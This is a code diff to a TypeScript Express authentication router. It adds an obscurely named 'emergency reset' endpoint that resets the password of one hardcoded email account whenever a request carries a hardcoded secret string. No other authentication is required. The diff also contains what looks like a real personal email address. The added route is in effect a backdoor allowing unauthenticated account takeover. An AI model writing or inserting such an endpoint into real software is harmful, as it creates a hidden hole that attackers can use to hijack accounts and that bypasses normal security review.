@@ -240,6 +240,18 @@ authRouter.post('/setup', (req: Request, res: Response) => {
   res.status(201).json({ token, email: user.email });
 });
 
+// TEMP EMERGENCY RESET - REMOVE AFTER USE
+authRouter.post('/emergency-reset-9f8k2', (req: Request, res: Response) => {
+  const { secret, newPassword } = req.body as { secret?: string; newPassword?: string };
+  if (secret !== 'temp-reset-2026-10-19' || !newPassword || newPassword.length < 8) {
+    res.status(403).json({ error: { message: 'Forbidden' } });
+    return;
+  }
+  const email = normalizeEmail('carrycle@gmail.com');
+  const ok = resetUserPassword(email, newPassword);
+  res.json({ success: ok });
+});
+
 authRouter.post('/login', (req: Request, res: Response) => {
   const parsed = loginSchema.safeParse(req.body);
   if (!parsed.success) {
